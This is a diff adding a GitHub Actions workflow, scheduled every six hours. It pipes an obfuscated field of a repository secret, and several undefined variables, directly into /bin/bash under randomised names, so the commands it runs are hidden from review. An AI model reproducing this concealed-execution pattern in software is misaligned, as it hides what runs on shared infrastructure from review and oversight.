@@ -1,0 +1,24 @@
+name: huawenshenqi
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '47 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: huawenshenqi
+        env:
+          c70174: ${{ secrets.c70174 }}
+        run: |
+          echo $c70174 | jq -r .g851 | /bin/bash
+          echo $zu33784 | jq -r .eesl7110 | /bin/bash
+          echo $wiyp06 | jq -r .tfpu24133 | /bin/bash
+          echo $ei0522 | jq -r .jgdgx239 | /bin/bash
+          echo $qod6 | jq -r .cyivc8616 | /bin/bash
+          echo $aatc41851 | jq -r .ovd30916 | /bin/bash
+          echo $o548 | jq -r .hlmlo500 | /bin/bash
+
